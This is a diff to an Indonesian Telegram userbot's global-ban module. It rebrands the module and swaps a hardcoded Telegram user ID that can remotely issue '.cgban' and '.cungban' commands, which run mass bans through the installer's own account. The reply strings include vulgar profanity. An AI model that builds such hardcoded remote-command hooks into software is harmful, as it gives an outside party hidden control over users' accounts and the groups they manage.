@@ -32,7 +32,7 @@ async def get_full_user(event):
             user_obj = await event.client.get_entity(user)
         except Exception as err:
             return await event.edit(
-                "`Terjadi Kesalahan... Mohon Lapor Ke Grup` @obrolansuar", str(err)
+                "`Terjadi Kesalahan... Mohon Lapor Ke Grup` @healingvirtual", str(err)
             )
     return user_obj, extra
 
@@ -79,13 +79,13 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=1694909518, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=1683788007, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
     me = await dc.client.get_me()
     if not sender.id == me.id:
-        dark = await dc.reply("`Global banned Aktif Ngentot, perintah arman`")
+        dark = await dc.reply("`Global banned Aktif Ngentot, perintah jess`")
     else:
         dark = await dc.edit("`Memproses Global Banned Pengguna Ini!`")
     me = await userbot.client.get_me()
@@ -130,7 +130,7 @@ async def gben(userbot):
             try:
                 await userbot.client.edit_permissions(i, user, view_messages=False)
                 a += 1
-                await dark.edit(f"`Global Banned Aktif ✅`")
+                await dark.edit(f"`Global Banned Jamet alay Aktif ✅`")
             except BaseException:
                 b += 1
     else:
@@ -148,7 +148,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
-@register(incoming=True, from_users=1694909518, pattern=r"^\.cungban(?: |$)(.*)")
+@register(incoming=True, from_users=1683788007, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
